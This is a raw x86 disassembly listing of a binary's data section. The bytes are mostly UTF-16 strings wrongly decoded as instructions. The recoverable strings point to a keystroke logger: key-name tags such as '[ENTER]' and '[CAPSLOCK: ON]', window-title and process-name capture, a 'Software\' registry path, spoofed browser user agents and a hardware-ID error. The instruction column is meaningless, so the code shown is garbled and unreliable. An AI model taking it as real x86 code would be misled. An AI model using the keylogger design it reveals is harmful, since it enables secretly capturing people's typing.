  4095d0:	55                   	push   %ebp
  4095d1:	00 70 00             	add    %dh,0x0(%eax)
  4095d4:	70 00                	jo     0x4095d6
  4095d6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4095da:	00 03                	add    %al,(%ebx)
  4095dc:	5b                   	pop    %ebx
  4095dd:	00 00                	add    %al,(%eax)
  4095df:	0b 53 00             	or     0x0(%ebx),%edx
  4095e2:	70 00                	jo     0x4095e4
  4095e4:	61                   	popa
  4095e5:	00 63 00             	add    %ah,0x0(%ebx)
  4095e8:	65 00 00             	add    %al,%gs:(%eax)
  4095eb:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  4095ee:	53                   	push   %ebx
  4095ef:	00 50 00             	add    %dl,0x0(%eax)
  4095f2:	41                   	inc    %ecx
  4095f3:	00 43 00             	add    %al,0x0(%ebx)
  4095f6:	45                   	inc    %ebp
  4095f7:	00 5d 00             	add    %bl,0x0(%ebp)
  4095fa:	00 0d 52 00 65 00    	add    %cl,0x650052
  409600:	74 00                	je     0x409602
  409602:	75 00                	jne    0x409604
  409604:	72 00                	jb     0x409606
  409606:	6e                   	outsb  %ds:(%esi),(%dx)
  409607:	00 00                	add    %al,(%eax)
  409609:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40960c:	45                   	inc    %ebp
  40960d:	00 4e 00             	add    %cl,0x0(%esi)
  409610:	54                   	push   %esp
  409611:	00 45 00             	add    %al,0x0(%ebp)
  409614:	52                   	push   %edx
  409615:	00 5d 00             	add    %bl,0x0(%ebp)
  409618:	00 0d 45 00 73 00    	add    %cl,0x730045
  40961e:	63 00                	arpl   %eax,(%eax)
  409620:	61                   	popa
  409621:	00 70 00             	add    %dh,0x0(%eax)
  409624:	65 00 00             	add    %al,%gs:(%eax)
  409627:	0b 5b 00             	or     0x0(%ebx),%ebx
  40962a:	45                   	inc    %ebp
  40962b:	00 53 00             	add    %dl,0x0(%ebx)
  40962e:	43                   	inc    %ebx
  40962f:	00 5d 00             	add    %bl,0x0(%ebp)
  409632:	00 17                	add    %dl,(%edi)
  409634:	4c                   	dec    %esp
  409635:	00 43 00             	add    %al,0x0(%ebx)
  409638:	6f                   	outsl  %ds:(%esi),(%dx)
  409639:	00 6e 00             	add    %ch,0x0(%esi)
  40963c:	74 00                	je     0x40963e
  40963e:	72 00                	jb     0x409640
  409640:	6f                   	outsl  %ds:(%esi),(%dx)
  409641:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  409645:	00 65 00             	add    %ah,0x0(%ebp)
  409648:	79 00                	jns    0x40964a
  40964a:	00 0d 5b 00 43 00    	add    %cl,0x43005b
  409650:	54                   	push   %esp
  409651:	00 52 00             	add    %dl,0x0(%edx)
  409654:	4c                   	dec    %esp
  409655:	00 5d 00             	add    %bl,0x0(%ebp)
  409658:	00 17                	add    %dl,(%edi)
  40965a:	52                   	push   %edx
  40965b:	00 43 00             	add    %al,0x0(%ebx)
  40965e:	6f                   	outsl  %ds:(%esi),(%dx)
  40965f:	00 6e 00             	add    %ch,0x0(%esi)
  409662:	74 00                	je     0x409664
  409664:	72 00                	jb     0x409666
  409666:	6f                   	outsl  %ds:(%esi),(%dx)
  409667:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40966b:	00 65 00             	add    %ah,0x0(%ebp)
  40966e:	79 00                	jns    0x409670
  409670:	00 13                	add    %dl,(%ebx)
  409672:	52                   	push   %edx
  409673:	00 53 00             	add    %dl,0x0(%ebx)
  409676:	68 00 69 00 66       	push   $0x66006900
  40967b:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40967f:	00 65 00             	add    %ah,0x0(%ebp)
  409682:	79 00                	jns    0x409684
  409684:	00 0f                	add    %cl,(%edi)
  409686:	5b                   	pop    %ebx
  409687:	00 53 00             	add    %dl,0x0(%ebx)
  40968a:	68 00 69 00 66       	push   $0x66006900
  40968f:	00 74 00 5d          	add    %dh,0x5d(%eax,%eax,1)
  409693:	00 00                	add    %al,(%eax)
  409695:	13 4c 00 53          	adc    0x53(%eax,%eax,1),%ecx
  409699:	00 68 00             	add    %ch,0x0(%eax)
  40969c:	69 00 66 00 74 00    	imul   $0x740066,(%eax),%eax
  4096a2:	4b                   	dec    %ebx
  4096a3:	00 65 00             	add    %ah,0x0(%ebp)
  4096a6:	79 00                	jns    0x4096a8
  4096a8:	00 09                	add    %cl,(%ecx)
  4096aa:	42                   	inc    %edx
  4096ab:	00 61 00             	add    %ah,0x0(%ecx)
  4096ae:	63 00                	arpl   %eax,(%eax)
  4096b0:	6b 00 00             	imul   $0x0,(%eax),%eax
  4096b3:	0d 5b 00 42 00       	or     $0x42005b,%eax
  4096b8:	61                   	popa
  4096b9:	00 63 00             	add    %ah,0x0(%ebx)
  4096bc:	6b 00 5d             	imul   $0x5d,(%eax),%eax
  4096bf:	00 00                	add    %al,(%eax)
  4096c1:	09 4c 00 57          	or     %ecx,0x57(%eax,%eax,1)
  4096c5:	00 69 00             	add    %ch,0x0(%ecx)
  4096c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c9:	00 00                	add    %al,(%eax)
  4096cb:	0b 5b 00             	or     0x0(%ebx),%ebx
  4096ce:	57                   	push   %edi
  4096cf:	00 49 00             	add    %cl,0x0(%ecx)
  4096d2:	4e                   	dec    %esi
  4096d3:	00 5d 00             	add    %bl,0x0(%ebp)
  4096d6:	00 07                	add    %al,(%edi)
  4096d8:	54                   	push   %esp
  4096d9:	00 61 00             	add    %ah,0x0(%ecx)
  4096dc:	62 00                	bound  %eax,(%eax)
  4096de:	00 0b                	add    %cl,(%ebx)
  4096e0:	5b                   	pop    %ebx
  4096e1:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  4096e5:	00 62 00             	add    %ah,0x0(%edx)
  4096e8:	5d                   	pop    %ebp
  4096e9:	00 00                	add    %al,(%eax)
  4096eb:	0f 43 00             	cmovae (%eax),%eax
  4096ee:	61                   	popa
  4096ef:	00 70 00             	add    %dh,0x0(%eax)
  4096f2:	69 00 74 00 61 00    	imul   $0x610074,(%eax),%eax
  4096f8:	6c                   	insb   (%dx),%es:(%edi)
  4096f9:	00 00                	add    %al,(%eax)
  4096fb:	1f                   	pop    %ds
  4096fc:	5b                   	pop    %ebx
  4096fd:	00 43 00             	add    %al,0x0(%ebx)
  409700:	41                   	inc    %ecx
  409701:	00 50 00             	add    %dl,0x0(%eax)
  409704:	53                   	push   %ebx
  409705:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  409709:	00 43 00             	add    %al,0x0(%ebx)
  40970c:	4b                   	dec    %ebx
  40970d:	00 3a                	add    %bh,(%edx)
  40970f:	00 20                	add    %ah,(%eax)
  409711:	00 4f 00             	add    %cl,0x0(%edi)
  409714:	46                   	inc    %esi
  409715:	00 46 00             	add    %al,0x0(%esi)
  409718:	5d                   	pop    %ebp
  409719:	00 00                	add    %al,(%eax)
  40971b:	1d 5b 00 43 00       	sbb    $0x43005b,%eax
  409720:	41                   	inc    %ecx
  409721:	00 50 00             	add    %dl,0x0(%eax)
  409724:	53                   	push   %ebx
  409725:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  409729:	00 43 00             	add    %al,0x0(%ebx)
  40972c:	4b                   	dec    %ebx
  40972d:	00 3a                	add    %bh,(%edx)
  40972f:	00 20                	add    %ah,(%eax)
  409731:	00 4f 00             	add    %cl,0x0(%edi)
  409734:	4e                   	dec    %esi
  409735:	00 5d 00             	add    %bl,0x0(%ebp)
  409738:	00 0b                	add    %cl,(%ebx)
  40973a:	23 00                	and    (%eax),%eax
  40973c:	23 00                	and    (%eax),%eax
  40973e:	23 00                	and    (%eax),%eax
  409740:	20 00                	and    %al,(%eax)
  409742:	20 00                	and    %al,(%eax)
  409744:	00 09                	add    %cl,(%ecx)
  409746:	20 00                	and    %al,(%eax)
  409748:	23 00                	and    (%eax),%eax
  40974a:	23 00                	and    (%eax),%eax
  40974c:	23 00                	and    (%eax),%eax
  40974e:	00 1f                	add    %bl,(%edi)
  409750:	4d                   	dec    %ebp
  409751:	00 61 00             	add    %ah,0x0(%ecx)
  409754:	69 00 6e 00 57 00    	imul   $0x57006e,(%eax),%eax
  40975a:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409760:	6f                   	outsl  %ds:(%esi),(%dx)
  409761:	00 77 00             	add    %dh,0x0(%edi)
  409764:	54                   	push   %esp
  409765:	00 69 00             	add    %ch,0x0(%ecx)
  409768:	74 00                	je     0x40976a
  40976a:	6c                   	insb   (%dx),%es:(%edi)
  40976b:	00 65 00             	add    %ah,0x0(%ebp)
  40976e:	00 17                	add    %dl,(%edi)
  409770:	50                   	push   %eax
  409771:	00 72 00             	add    %dh,0x0(%edx)
  409774:	6f                   	outsl  %ds:(%esi),(%dx)
  409775:	00 63 00             	add    %ah,0x0(%ebx)
  409778:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40977c:	73 00                	jae    0x40977e
  40977e:	4e                   	dec    %esi
  40977f:	00 61 00             	add    %ah,0x0(%ecx)
  409782:	6d                   	insl   (%dx),%es:(%edi)
  409783:	00 65 00             	add    %ah,0x0(%ebp)
  409786:	00 07                	add    %al,(%edi)
  409788:	3f                   	aas
  409789:	00 3f                	add    %bh,(%edi)
  40978b:	00 3f                	add    %bh,(%edi)
  40978d:	00 00                	add    %al,(%eax)
  40978f:	13 53 00             	adc    0x0(%ebx),%edx
  409792:	6f                   	outsl  %ds:(%esi),(%dx)
  409793:	00 66 00             	add    %ah,0x0(%esi)
  409796:	74 00                	je     0x409798
  409798:	77 00                	ja     0x40979a
  40979a:	61                   	popa
  40979b:	00 72 00             	add    %dh,0x0(%edx)
  40979e:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  4097a3:	80 9b 4d 00 6f 00 7a 	sbbb   $0x7a,0x6f004d(%ebx)
  4097aa:	00 69 00             	add    %ch,0x0(%ecx)
  4097ad:	6c                   	insb   (%dx),%es:(%edi)
  4097ae:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  4097b2:	00 2f                	add    %ch,(%edi)
  4097b4:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  4097ba:	00 20                	add    %ah,(%eax)
  4097bc:	00 28                	add    %ch,(%eax)
  4097be:	00 57 00             	add    %dl,0x0(%edi)
  4097c1:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4097c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4097c8:	00 77 00             	add    %dh,0x0(%edi)
  4097cb:	73 00                	jae    0x4097cd
  4097cd:	20 00                	and    %al,(%eax)
  4097cf:	4e                   	dec    %esi
  4097d0:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4097d4:	00 36                	add    %dh,(%esi)
  4097d6:	00 2e                	add    %ch,(%esi)
  4097d8:	00 31                	add    %dh,(%ecx)
  4097da:	00 3b                	add    %bh,(%ebx)
  4097dc:	00 20                	add    %ah,(%eax)
  4097de:	00 57 00             	add    %dl,0x0(%edi)
  4097e1:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  4097e7:	34 00                	xor    $0x0,%al
  4097e9:	3b 00                	cmp    (%eax),%eax
  4097eb:	20 00                	and    %al,(%eax)
  4097ed:	78 00                	js     0x4097ef
  4097ef:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  4097f3:	3b 00                	cmp    (%eax),%eax
  4097f5:	20 00                	and    %al,(%eax)
  4097f7:	72 00                	jb     0x4097f9
  4097f9:	76 00                	jbe    0x4097fb
  4097fb:	3a 00                	cmp    (%eax),%al
  4097fd:	36 00 36             	add    %dh,%ss:(%esi)
  409800:	00 2e                	add    %ch,(%esi)
  409802:	00 30                	add    %dh,(%eax)
  409804:	00 29                	add    %ch,(%ecx)
  409806:	00 20                	add    %ah,(%eax)
  409808:	00 47 00             	add    %al,0x0(%edi)
  40980b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40980f:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409812:	00 2f                	add    %ch,(%edi)
  409814:	00 32                	add    %dh,(%edx)
  409816:	00 30                	add    %dh,(%eax)
  409818:	00 31                	add    %dh,(%ecx)
  40981a:	00 30                	add    %dh,(%eax)
  40981c:	00 30                	add    %dh,(%eax)
  40981e:	00 31                	add    %dh,(%ecx)
  409820:	00 30                	add    %dh,(%eax)
  409822:	00 31                	add    %dh,(%ecx)
  409824:	00 20                	add    %ah,(%eax)
  409826:	00 46 00             	add    %al,0x0(%esi)
  409829:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  40982f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409833:	78 00                	js     0x409835
  409835:	2f                   	das
  409836:	00 36                	add    %dh,(%esi)
  409838:	00 36                	add    %dh,(%esi)
  40983a:	00 2e                	add    %ch,(%esi)
  40983c:	00 30                	add    %dh,(%eax)
  40983e:	00 00                	add    %al,(%eax)
  409840:	81 13 4d 00 6f 00    	adcl   $0x6f004d,(%ebx)
  409846:	7a 00                	jp     0x409848
  409848:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40984e:	61                   	popa
  40984f:	00 2f                	add    %ch,(%edi)
  409851:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  409857:	00 20                	add    %ah,(%eax)
  409859:	00 28                	add    %ch,(%eax)
  40985b:	00 69 00             	add    %ch,0x0(%ecx)
  40985e:	50                   	push   %eax
  40985f:	00 68 00             	add    %ch,0x0(%eax)
  409862:	6f                   	outsl  %ds:(%esi),(%dx)
  409863:	00 6e 00             	add    %ch,0x0(%esi)
  409866:	65 00 3b             	add    %bh,%gs:(%ebx)
  409869:	00 20                	add    %ah,(%eax)
  40986b:	00 43 00             	add    %al,0x0(%ebx)
  40986e:	50                   	push   %eax
  40986f:	00 55 00             	add    %dl,0x0(%ebp)
  409872:	20 00                	and    %al,(%eax)
  409874:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  40987a:	6f                   	outsl  %ds:(%esi),(%dx)
  40987b:	00 6e 00             	add    %ch,0x0(%esi)
  40987e:	65 00 20             	add    %ah,%gs:(%eax)
  409881:	00 4f 00             	add    %cl,0x0(%edi)
  409884:	53                   	push   %ebx
  409885:	00 20                	add    %ah,(%eax)
  409887:	00 31                	add    %dh,(%ecx)
  409889:	00 31                	add    %dh,(%ecx)
  40988b:	00 5f 00             	add    %bl,0x0(%edi)
  40988e:	34 00                	xor    $0x0,%al
  409890:	5f                   	pop    %edi
  409891:	00 31                	add    %dh,(%ecx)
  409893:	00 20                	add    %ah,(%eax)
  409895:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409899:	00 6b 00             	add    %ch,0x0(%ebx)
  40989c:	65 00 20             	add    %ah,%gs:(%eax)
  40989f:	00 4d 00             	add    %cl,0x0(%ebp)
  4098a2:	61                   	popa
  4098a3:	00 63 00             	add    %ah,0x0(%ebx)
  4098a6:	20 00                	and    %al,(%eax)
  4098a8:	4f                   	dec    %edi
  4098a9:	00 53 00             	add    %dl,0x0(%ebx)
  4098ac:	20 00                	and    %al,(%eax)
  4098ae:	58                   	pop    %eax
  4098af:	00 29                	add    %ch,(%ecx)
  4098b1:	00 20                	add    %ah,(%eax)
  4098b3:	00 41 00             	add    %al,0x0(%ecx)
  4098b6:	70 00                	jo     0x4098b8
  4098b8:	70 00                	jo     0x4098ba
  4098ba:	6c                   	insb   (%dx),%es:(%edi)
  4098bb:	00 65 00             	add    %ah,0x0(%ebp)
  4098be:	57                   	push   %edi
  4098bf:	00 65 00             	add    %ah,0x0(%ebp)
  4098c2:	62 00                	bound  %eax,(%eax)
  4098c4:	4b                   	dec    %ebx
  4098c5:	00 69 00             	add    %ch,0x0(%ecx)
  4098c8:	74 00                	je     0x4098ca
  4098ca:	2f                   	das
  4098cb:	00 36                	add    %dh,(%esi)
  4098cd:	00 30                	add    %dh,(%eax)
  4098cf:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  4098d5:	00 2e                	add    %ch,(%esi)
  4098d7:	00 31                	add    %dh,(%ecx)
  4098d9:	00 35 00 20 00 28    	add    %dh,0x28002000
  4098df:	00 4b 00             	add    %cl,0x0(%ebx)
  4098e2:	48                   	dec    %eax
  4098e3:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  4098e7:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  4098eb:	00 20                	add    %ah,(%eax)
  4098ed:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4098f1:	00 6b 00             	add    %ch,0x0(%ebx)
  4098f4:	65 00 20             	add    %ah,%gs:(%eax)
  4098f7:	00 47 00             	add    %al,0x0(%edi)
  4098fa:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4098fe:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409901:	00 29                	add    %ch,(%ecx)
  409903:	00 20                	add    %ah,(%eax)
  409905:	00 56 00             	add    %dl,0x0(%esi)
  409908:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40990c:	73 00                	jae    0x40990e
  40990e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409914:	2f                   	das
  409915:	00 31                	add    %dh,(%ecx)
  409917:	00 31                	add    %dh,(%ecx)
  409919:	00 2e                	add    %ch,(%esi)
  40991b:	00 30                	add    %dh,(%eax)
  40991d:	00 20                	add    %ah,(%eax)
  40991f:	00 4d 00             	add    %cl,0x0(%ebp)
  409922:	6f                   	outsl  %ds:(%esi),(%dx)
  409923:	00 62 00             	add    %ah,0x0(%edx)
  409926:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40992c:	2f                   	das
  40992d:	00 31                	add    %dh,(%ecx)
  40992f:	00 35 00 45 00 31    	add    %dh,0x31004500
  409935:	00 34 00             	add    %dh,(%eax,%eax,1)
  409938:	38 00                	cmp    %al,(%eax)
  40993a:	20 00                	and    %al,(%eax)
  40993c:	53                   	push   %ebx
  40993d:	00 61 00             	add    %ah,0x0(%ecx)
  409940:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409944:	72 00                	jb     0x409946
  409946:	69 00 2f 00 36 00    	imul   $0x36002f,(%eax),%eax
  40994c:	30 00                	xor    %al,(%eax)
  40994e:	34 00                	xor    $0x0,%al
  409950:	2e 00 31             	add    %dh,%cs:(%ecx)
  409953:	00 00                	add    %al,(%eax)
  409955:	80 e7 4d             	and    $0x4d,%bh
  409958:	00 6f 00             	add    %ch,0x0(%edi)
  40995b:	7a 00                	jp     0x40995d
  40995d:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  409963:	61                   	popa
  409964:	00 2f                	add    %ch,(%edi)
  409966:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  40996c:	00 20                	add    %ah,(%eax)
  40996e:	00 28                	add    %ch,(%eax)
  409970:	00 57 00             	add    %dl,0x0(%edi)
  409973:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409979:	6f                   	outsl  %ds:(%esi),(%dx)
  40997a:	00 77 00             	add    %dh,0x0(%edi)
  40997d:	73 00                	jae    0x40997f
  40997f:	20 00                	and    %al,(%eax)
  409981:	4e                   	dec    %esi
  409982:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  409986:	00 31                	add    %dh,(%ecx)
  409988:	00 30                	add    %dh,(%eax)
  40998a:	00 2e                	add    %ch,(%esi)
  40998c:	00 30                	add    %dh,(%eax)
  40998e:	00 3b                	add    %bh,(%ebx)
  409990:	00 20                	add    %ah,(%eax)
  409992:	00 57 00             	add    %dl,0x0(%edi)
  409995:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  40999b:	34 00                	xor    $0x0,%al
  40999d:	3b 00                	cmp    (%eax),%eax
  40999f:	20 00                	and    %al,(%eax)
  4099a1:	78 00                	js     0x4099a3
  4099a3:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  4099a7:	29 00                	sub    %eax,(%eax)
  4099a9:	20 00                	and    %al,(%eax)
  4099ab:	41                   	inc    %ecx
  4099ac:	00 70 00             	add    %dh,0x0(%eax)
  4099af:	70 00                	jo     0x4099b1
  4099b1:	6c                   	insb   (%dx),%es:(%edi)
  4099b2:	00 65 00             	add    %ah,0x0(%ebp)
  4099b5:	57                   	push   %edi
  4099b6:	00 65 00             	add    %ah,0x0(%ebp)
  4099b9:	62 00                	bound  %eax,(%eax)
  4099bb:	4b                   	dec    %ebx
  4099bc:	00 69 00             	add    %ch,0x0(%ecx)
  4099bf:	74 00                	je     0x4099c1
  4099c1:	2f                   	das
  4099c2:	00 35 00 33 00 37    	add    %dh,0x37003300
  4099c8:	00 2e                	add    %ch,(%esi)
  4099ca:	00 33                	add    %dh,(%ebx)
  4099cc:	00 36                	add    %dh,(%esi)
  4099ce:	00 20                	add    %ah,(%eax)
  4099d0:	00 28                	add    %ch,(%eax)
  4099d2:	00 4b 00             	add    %cl,0x0(%ebx)
  4099d5:	48                   	dec    %eax
  4099d6:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  4099da:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  4099de:	00 20                	add    %ah,(%eax)
  4099e0:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4099e4:	00 6b 00             	add    %ch,0x0(%ebx)
  4099e7:	65 00 20             	add    %ah,%gs:(%eax)
  4099ea:	00 47 00             	add    %al,0x0(%edi)
  4099ed:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4099f1:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  4099f4:	00 29                	add    %ch,(%ecx)
  4099f6:	00 20                	add    %ah,(%eax)
  4099f8:	00 43 00             	add    %al,0x0(%ebx)
  4099fb:	68 00 72 00 6f       	push   $0x6f007200
  409a00:	00 6d 00             	add    %ch,0x0(%ebp)
  409a03:	65 00 2f             	add    %ch,%gs:(%edi)
  409a06:	00 36                	add    %dh,(%esi)
  409a08:	00 30                	add    %dh,(%eax)
  409a0a:	00 2e                	add    %ch,(%esi)
  409a0c:	00 30                	add    %dh,(%eax)
  409a0e:	00 2e                	add    %ch,(%esi)
  409a10:	00 33                	add    %dh,(%ebx)
  409a12:	00 31                	add    %dh,(%ecx)
  409a14:	00 31                	add    %dh,(%ecx)
  409a16:	00 32                	add    %dh,(%edx)
  409a18:	00 2e                	add    %ch,(%esi)
  409a1a:	00 31                	add    %dh,(%ecx)
  409a1c:	00 31                	add    %dh,(%ecx)
  409a1e:	00 33                	add    %dh,(%ebx)
  409a20:	00 20                	add    %ah,(%eax)
  409a22:	00 53 00             	add    %dl,0x0(%ebx)
  409a25:	61                   	popa
  409a26:	00 66 00             	add    %ah,0x0(%esi)
  409a29:	61                   	popa
  409a2a:	00 72 00             	add    %dh,0x0(%edx)
  409a2d:	69 00 2f 00 35 00    	imul   $0x35002f,(%eax),%eax
  409a33:	33 00                	xor    (%eax),%eax
  409a35:	37                   	aaa
  409a36:	00 2e                	add    %ch,(%esi)
  409a38:	00 33                	add    %dh,(%ebx)
  409a3a:	00 36                	add    %dh,(%esi)
  409a3c:	00 00                	add    %al,(%eax)
  409a3e:	35 61 00 62 00       	xor    $0x620061,%eax
  409a43:	63 00                	arpl   %eax,(%eax)
  409a45:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409a49:	66 00 67 00          	data16 add %ah,0x0(%edi)
  409a4d:	68 00 69 00 6a       	push   $0x6a006900
  409a52:	00 6b 00             	add    %ch,0x0(%ebx)
  409a55:	6c                   	insb   (%dx),%es:(%edi)
  409a56:	00 6d 00             	add    %ch,0x0(%ebp)
  409a59:	6e                   	outsb  %ds:(%esi),(%dx)
  409a5a:	00 6f 00             	add    %ch,0x0(%edi)
  409a5d:	70 00                	jo     0x409a5f
  409a5f:	71 00                	jno    0x409a61
  409a61:	72 00                	jb     0x409a63
  409a63:	73 00                	jae    0x409a65
  409a65:	74 00                	je     0x409a67
  409a67:	75 00                	jne    0x409a69
  409a69:	76 00                	jbe    0x409a6b
  409a6b:	77 00                	ja     0x409a6d
  409a6d:	78 00                	js     0x409a6f
  409a6f:	79 00                	jns    0x409a71
  409a71:	7a 00                	jp     0x409a73
  409a73:	00 11                	add    %dl,(%ecx)
  409a75:	45                   	inc    %ebp
  409a76:	00 72 00             	add    %dh,0x0(%edx)
  409a79:	72 00                	jb     0x409a7b
  409a7b:	20 00                	and    %al,(%eax)
  409a7d:	48                   	dec    %eax
  409a7e:	00 57 00             	add    %dl,0x0(%edi)
  409a81:	49                   	dec    %ecx
  409a82:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  409a86:	05 78 00 32 00       	add    $0x320078,%eax
  409a8b:	00 09                	add    %cl,(%ecx)
  409a8d:	52                   	push   %edx
  409a8e:	00 65 00             	add    %ah,0x0(%ebp)
  409a91:	61                   	popa
  409a92:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  409a96:	0b 57 00             	or     0x0(%edi),%edx
  409a99:	72 00                	jb     0x409a9b
  409a9b:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  409aa1:	00 0b                	add    %cl,(%ebx)
  409aa3:	46                   	inc    %esi
  409aa4:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  409aa8:	00 73 00             	add    %dh,0x0(%ebx)
  409aab:	68 00 00 0f 54       	push   $0x540f0000
  409ab0:	00 6f 00             	add    %ch,0x0(%edi)
  409ab3:	41                   	inc    %ecx
  409ab4:	00 72 00             	add    %dh,0x0(%edx)
  409ab7:	72 00                	jb     0x409ab9
  409ab9:	61                   	popa
  409aba:	00 79 00             	add    %bh,0x0(%ecx)
  409abd:	00 00                	add    %al,(%eax)
  409abf:	00 37                	add    %dh,(%edi)
  409ac1:	42                   	inc    %edx
  409ac2:	e0 61                	loopne 0x409b25
  409ac4:	12 d8                	adc    %al,%bl
  409ac6:	d4 40                	aam    $0x40
  409ac8:	9d                   	popf
  409ac9:	01 63 cf             	add    %esp,-0x31(%ebx)
  409acc:	8c 71 08             	mov    %?,0x8(%ecx)
  409acf:	a0 00 08 b7 7a       	mov    0x7ab70800,%al
  409ad4:	5c                   	pop    %esp
  409ad5:	56                   	push   %esi
  409ad6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  409ad9:	89 08                	mov    %ecx,(%eax)
  409adb:	b0 3f                	mov    $0x3f,%al
  409add:	5f                   	pop    %edi
  409ade:	7f 11                	jg     0x409af1
  409ae0:	d5 0a                	aad    $0xa
  409ae2:	3a 03                	cmp    (%ebx),%al
  409ae4:	20 00                	and    %al,(%eax)
  409ae6:	01 03                	add    %eax,(%ebx)
  409ae8:	00 00                	add    %al,(%eax)
  409aea:	01 04 00             	add    %eax,(%eax,%eax,1)
  409aed:	00 12                	add    %dl,(%edx)
  409aef:	0c 07                	or     $0x7,%al
  409af1:	06                   	push   %es
  409af2:	15 12 18 01 12       	adc    $0x12011812,%eax
  409af7:	0c 04                	or     $0x4,%al
  409af9:	00 00                	add    %al,(%eax)
  409afb:	12 08                	adc    (%eax),%cl
  409afd:	07                   	pop    %es
  409afe:	06                   	push   %es
  409aff:	15 12 18 01 12       	adc    $0x12011812,%eax
  409b04:	08 04 00             	or     %al,(%eax,%eax,1)
  409b07:	00 12                	add    %dl,(%edx)
  409b09:	11 07                	adc    %eax,(%edi)
  409b0b:	06                   	push   %es
  409b0c:	15 12 18 01 12       	adc    $0x12011812,%eax
  409b11:	11 04 00             	adc    %eax,(%eax,%eax,1)
  409b14:	00 12                	add    %dl,(%edx)
  409b16:	14 07                	adc    $0x7,%al
  409b18:	06                   	push   %es
  409b19:	15 12 18 01 12       	adc    $0x12011812,%eax
  409b1e:	14 04                	adc    $0x4,%al
  409b20:	08 00                	or     %al,(%eax)
  409b22:	12 0c 04             	adc    (%esp,%eax,1),%cl
  409b25:	08 00                	or     %al,(%eax)
  409b27:	12 08                	adc    (%eax),%cl
  409b29:	04 08                	add    $0x8,%al
  409b2b:	00 12                	add    %dl,(%edx)
  409b2d:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  409b30:	00 12                	add    %dl,(%edx)
  409b32:	14 04                	adc    $0x4,%al
  409b34:	20 01                	and    %al,(%ecx)
  409b36:	02 1c 03             	add    (%ebx,%eax,1),%bl
  409b39:	20 00                	and    %al,(%eax)
  409b3b:	08 04 20             	or     %al,(%eax,%eiz,1)
  409b3e:	00 12                	add    %dl,(%edx)
  409b40:	15 03 20 00 0e       	adc    $0xe002003,%eax
  409b45:	02 1e                	add    (%esi),%bl
  409b47:	00 07                	add    %al,(%edi)
  409b49:	10 01                	adc    %al,(%ecx)
  409b4b:	01 1e                	add    %ebx,(%esi)
  409b4d:	00 1e                	add    %bl,(%esi)
  409b4f:	00 07                	add    %al,(%edi)
  409b51:	30 01                	xor    %al,(%ecx)
  409b53:	01 01                	add    %eax,(%ecx)
  409b55:	10 1e                	adc    %bl,(%esi)
  409b57:	00 02                	add    %al,(%edx)
  409b59:	13 00                	adc    (%eax),%eax
  409b5b:	04 20                	add    $0x20,%al
  409b5d:	00 13                	add    %dl,(%ebx)
  409b5f:	00 03                	add    %al,(%ebx)
  409b61:	06                   	push   %es
  409b62:	13 00                	adc    (%eax),%eax
  409b64:	04 28                	add    $0x28,%al
  409b66:	00 13                	add    %dl,(%ebx)
  409b68:	00 02                	add    %al,(%edx)
  409b6a:	06                   	push   %es
  409b6b:	0e                   	push   %cs
  409b6c:	02 06                	add    (%esi),%al
  409b6e:	08 04 00             	or     %al,(%eax,%eax,1)
  409b71:	01 0e                	add    %ecx,(%esi)
  409b73:	0e                   	push   %cs
  409b74:	02 06                	add    (%esi),%al
  409b76:	02 03                	add    (%ebx),%al
